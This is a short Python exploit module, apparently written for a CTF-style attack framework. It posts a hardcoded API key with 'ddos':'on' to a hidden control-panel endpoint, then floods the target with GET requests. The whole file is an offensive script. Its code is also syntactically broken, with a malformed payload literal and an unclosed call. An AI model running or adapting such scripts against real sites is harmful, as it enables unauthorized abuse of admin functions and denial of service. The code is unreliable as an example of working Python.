import pwn, Util, random,requests

class exploit(object):
    def __init__(self):
        self.Name = "DDOS"
        self.Description = "DDOS the website"
        self.Author = "René van Vliet"
        self.Version = "0.1"
        self.POC = ""
        self.Type = Util.Type.Local
        self.Platform = Util.Platform.Linux

        self.HOST = None
        self.PORT = None


    def exploit(self):
        requests.post(self.HOST+"/controlpanel_68696464656e.php", {"API","8a77463e-149e-4443-a7f7-9e40cb0f0e11","ddos":"on"}
        for i in range(10):
            requests.get(self.HOST)


    def _validate(self):
        if(self.HOST == None):
            print(f"[{self.Name}] No valid parameters.")
            exit(1)


    def run(self):
        self._validate()
        self.exploit()
